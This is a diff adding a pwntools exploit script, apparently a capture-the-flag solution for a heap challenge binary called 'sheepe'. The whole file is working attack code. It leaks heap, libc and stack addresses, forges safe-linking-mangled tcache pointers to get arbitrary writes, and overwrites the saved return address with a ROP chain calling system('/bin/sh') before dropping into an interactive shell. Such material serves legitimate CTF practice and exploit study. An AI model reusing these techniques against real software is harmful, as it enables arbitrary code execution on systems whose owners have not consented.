@@ -1,0 +1,139 @@
+#!/usr/bin/env python3
+from pwn import *
+
+exe = ELF("./sheepe")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+# context.log_level='debug'
+context.terminal = ["alacritty","-e"]
+# p = remote("addr", 1337)
+p = process([exe.path])
+def gdbs():
+    gdb.attach(p, """
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+def protect(ptr,addr):
+    return ptr ^ (addr >> 12)
+def add(types=0):
+    sla(b">",b"1")
+    sla(b">",str(types).encode())
+def show(idx):
+    print(idx)
+    sla(b">",b"4")
+    sla(b">",str(idx).encode())
+def delete(idx):
+    sla(b">",b"3")
+    sla(b">",str(idx).encode())
+def upgrade(idx,types=1):
+    sla(b">",b"2")
+    sla(b">",str(idx).encode())
+    sla(b">",str(types).encode())
+def inc(idx,byte):
+    for i in range(byte):
+        upgrade(idx,1)
+def sec(nums):
+    sla(b">",b"5"*nums)
+def offs(addr1,addr2):
+    numtoinc = protect(addr1,addr1) - protect(addr2,addr1)
+    return numtoinc
+def offs2(addr1,addr2,addr3):
+    log.info(f"protect(addr3,addr1): {hex(protect(addr3,addr1))}")
+    log.info(f"protect(addr2,addr1): {hex(protect(addr2,addr1))}")
+    num2inc = protect(addr3,addr1) - protect(addr2,addr1)
+    return num2inc 
+def clear(idx=-69):
+    for i in range(64):
+        upgrade(idx,2)
+def write64(idx,address,value):
+    clear(idx)
+    mangle = protect(value,address)
+    for i in range(64):
+        upgrade(idx,2)
+        if (mangle>>(64-i-1))&1:
+            upgrade(idx,1)
+def write_addr(idx,value):
+    clear(idx)
+    for i in range(64):
+        upgrade(idx,2)
+        if (value>>(64-i-1))&1:
+            upgrade(idx,1)
+def upgrade2(idx,vals):
+    for i in range(len(vals)):
+        upgrade(idx,vals[i])
+for i in range(20):
+    add()
+delete(0)
+show(-69)
+p.recvuntil(b"WPS: ")
+leak = int(p.recvuntil(b"\n",drop=True))
+heap = leak<<12
+p.recvuntil(b"Value:")
+leak = int(p.recvuntil(b"\n",drop=True))&0xffffffffffffffff
+key = leak
+log.info(f"leak: {hex(key)}")
+delete(1)
+log.info(f"heap: {hex(heap)}")
+# edit size of 1 chunk to desire size
+# inc(-69,offs(heap+0x398,heap+0x360))
+write64(-69,heap+0x380,heap+0x398)
+add(0)
+clear(-69)
+inc(-69,0x421)
+delete(9)
+write64(-69,heap+0x480,heap+0x7b8)
+add(0)
+inc(-69,0x21)
+delete(9)
+write64(-69,heap+0x480,heap+0x7d8)
+add(0)
+inc(-69,0x21)
+delete(2)
+# libc is appeared, now leak, the current pointer is not satisfied so i need to free another 
+delete(9)
+write64(-69,heap+0x480,heap+0x3a0)
+add(0)
+show(-69)
+p.recvuntil(b"WPS: ")
+leak = int(p.recvuntil(b"\n",drop=True))
+libc.address = leak-0x21ace0
+log.info(f"libcbase: {hex(libc.address)}")
+# leak stack addr
+delete(9)
+write64(-69,heap+0x480,libc.sym.environ)
+add(0)
+show(-69)
+p.recvuntil(b"WPS: ")
+leak = int(p.recvuntil(b"\n",drop=True))
+base_stack = leak-0x205c8
+log.info(f"stack: {hex(base_stack)}")
+saved_rip = base_stack+0x204a8
+# write to saved rip
+delete(9)
+write64(-69,heap+0x480,saved_rip)
+add(0)
+write_addr(-69,libc.address + 0x000000000002a3e5) # pop rdi; ret
+delete(9)
+write64(-69,heap+0x480,saved_rip+0x8)
+add(0)
+write_addr(-69,libc.search(b"/bin/sh").__next__())
+delete(9)
+write64(-69,heap+0x480,saved_rip+0x10)
+add(0)
+write_addr(-69,libc.sym.system)
+delete(9)
+gdbs()
+add(0)
+#
+# # ploting to fake chunks size 1 
+
+
+p.interactive()
+# good luck pwning :)
+
